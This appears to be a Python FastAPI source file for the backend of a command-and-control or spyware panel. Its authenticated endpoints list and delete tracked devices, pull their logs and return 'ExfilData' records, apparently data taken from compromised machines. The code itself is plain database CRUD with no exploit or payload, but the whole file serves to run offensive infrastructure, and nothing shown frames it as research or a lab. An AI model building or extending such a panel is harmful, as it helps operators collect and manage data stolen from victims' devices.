from fastapi import APIRouter, Depends, HTTPException
from sqlalchemy.orm import Session
from sqlalchemy import desc
from ..database import get_db, Device, Log, ExfilData
from ..auth import get_current_user
from ..schemas import DeviceResponse, LogResponse, ExfilDataResponse
from typing import List

router = APIRouter(prefix="/api/devices", tags=["devices"], redirect_slashes=False)


@router.get("", response_model=List[DeviceResponse])
async def get_devices(
    skip: int = 0,
    limit: int = 100,
    status: str = None,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    query = db.query(Device).order_by(desc(Device.last_seen))
    if status:
        query = query.filter(Device.status == status)
    devices = query.offset(skip).limit(limit).all()
    return devices


@router.get("/{device_uuid}", response_model=DeviceResponse)
async def get_device(device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    return device


@router.get("/{device_uuid}/logs", response_model=List[LogResponse])
async def get_device_logs(
    device_uuid: str,
    skip: int = 0,
    limit: int = 100,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    logs = db.query(Log).filter(Log.ip == device.ip).order_by(desc(Log.timestamp)).offset(skip).limit(limit).all()
    return logs


@router.get("/{device_uuid}/exfil", response_model=List[ExfilDataResponse])
async def get_device_exfil(
    device_uuid: str,
    skip: int = 0,
    limit: int = 100,
    db: Session = Depends(get_db),
    current_user=Depends(get_current_user)
):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    exfil = db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).order_by(desc(ExfilData.uploaded_at)).offset(skip).limit(limit).all()
    return exfil


@router.delete("/{device_uuid}")
async def delete_device(device_uuid: str, db: Session = Depends(get_db), current_user=Depends(get_current_user)):
    device = db.query(Device).filter(Device.device_uuid == device_uuid).first()
    if not device:
        raise HTTPException(status_code=404, detail="Device not found")
    
    db.query(ExfilData).filter(ExfilData.device_uuid == device_uuid).delete()
    db.delete(device)
    db.commit()
    return {"message": "Device deleted"}
